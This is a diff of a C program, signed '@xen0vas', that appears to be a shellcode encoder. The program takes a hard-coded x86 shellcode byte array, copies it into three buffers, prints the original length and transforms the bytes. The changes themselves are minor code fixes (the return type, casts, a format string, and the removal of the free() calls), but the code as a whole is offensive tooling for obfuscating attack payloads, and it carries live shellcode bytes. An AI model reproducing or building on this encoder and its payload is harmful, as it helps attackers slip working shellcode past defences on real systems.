@@ -31,12 +31,12 @@ unsigned char shellcode[] = \
 "\x52\x52\x31\xc0\x04\x2c\x50\x89\xe0\x53\x50\x52\x52\x52\x31\xc0\x40\x50"
 "\x52\x52\x51\x52\xff\xd5";
 
-void main(int argc, char * argv[])
+int main(int argc, char * argv[])
 {
 
 printf("\033[01;33m");
 printf("                                                 \n");
-printf("                         _\|/_                   \n");
+printf("                         _\\|/_                   \n");
 printf("                         (o o)			 \n");
 printf("           +----------oOO-{_}-OOo----------+	 \n");
 printf("                    			         \n");    
@@ -54,13 +54,13 @@ printf("\033[0m");
 	printf("\n\n\n");
 	printf("\033[0m");
 
-	unsigned char *shellcode1=(char*)malloc(sizeof(shellcode)*2);
+	unsigned char *shellcode1=(unsigned char*)malloc(sizeof(shellcode)*2);
 	memset( shellcode1, 0, sizeof(shellcode1)*2);
 
-	unsigned char *shellcode2=(char*)malloc(sizeof(shellcode)*2);
+	unsigned char *shellcode2=(unsigned char*)malloc(sizeof(shellcode)*2);
 	memset( shellcode2, 0, sizeof(shellcode2)*2);
 
-	unsigned char *shellcode3=(char*)malloc(sizeof(shellcode)*2);
+	unsigned char *shellcode3=(unsigned char*)malloc(sizeof(shellcode)*2);
 	memset( shellcode3, 0, sizeof(shellcode3)*2);
 
 	for (int o=0; o<sizeof(shellcode)-1; o++) {
@@ -96,7 +96,7 @@ printf("\033[0m");
 
 
         printf("\033[01;33m");
-	printf("\n\n[*] Original Shellcode Length : %d\n",sizeof(shellcode));
+	printf("\n\n[*] Original Shellcode Length : %ld\n",sizeof(shellcode));
 	printf("\033[0m");
 
 	for (int i=0; i<(sizeof(shellcode)*2); i++) {
@@ -146,9 +146,7 @@ printf("\033[0m");
         }
 
 	printf("\n\n");
-	free(shellcode1);
-	free(shellcode2);
-	free(shellcode3); 
+
 }
 
 /* @xen0vas */
